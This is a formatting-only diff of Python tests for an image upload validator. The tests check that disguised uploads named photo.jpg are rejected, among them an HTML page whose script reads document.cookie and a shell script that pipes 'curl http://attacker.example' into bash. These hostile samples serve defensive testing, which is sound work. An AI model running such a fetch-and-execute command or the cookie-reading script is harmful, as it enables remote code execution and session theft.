@@ -20,7 +20,9 @@ _PNG = (
 # WebP: minimal RIFF/WEBP header (libmagic may fall back to signature check on macOS)
 _WEBP = b"RIFF\x04\x00\x00\x00WEBP"
 # GIF89a — valid image format intentionally excluded from the allowed list
-_GIF = b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;"
+_GIF = (
+    b"GIF89a\x01\x00\x01\x00\x00\xff\x00,\x00\x00\x00\x00\x01\x00\x01\x00\x00\x02\x00;"
+)
 
 
 def _upload(content: bytes, name: str = "test.jpg") -> SimpleUploadedFile:
@@ -62,10 +64,12 @@ class ImageValidatorTests(SimpleTestCase):
 
     def test_html_with_script_rejected(self):
         with self.assertRaises(ValidationError):
-            self.v(_upload(
-                b"<html><body><script>document.cookie</script></body></html>",
-                "photo.jpg",
-            ))
+            self.v(
+                _upload(
+                    b"<html><body><script>document.cookie</script></body></html>",
+                    "photo.jpg",
+                )
+            )
 
     def test_svg_with_embedded_script_rejected(self):
         # SVG can execute JavaScript when rendered — must be rejected
@@ -84,10 +88,12 @@ class ImageValidatorTests(SimpleTestCase):
 
     def test_shell_script_rejected(self):
         with self.assertRaises(ValidationError):
-            self.v(_upload(
-                b"#!/bin/bash\ncurl http://attacker.example | bash\n",
-                "photo.jpg",
-            ))
+            self.v(
+                _upload(
+                    b"#!/bin/bash\ncurl http://attacker.example | bash\n",
+                    "photo.jpg",
+                )
+            )
 
     def test_elf_binary_rejected(self):
         with self.assertRaises(ValidationError):
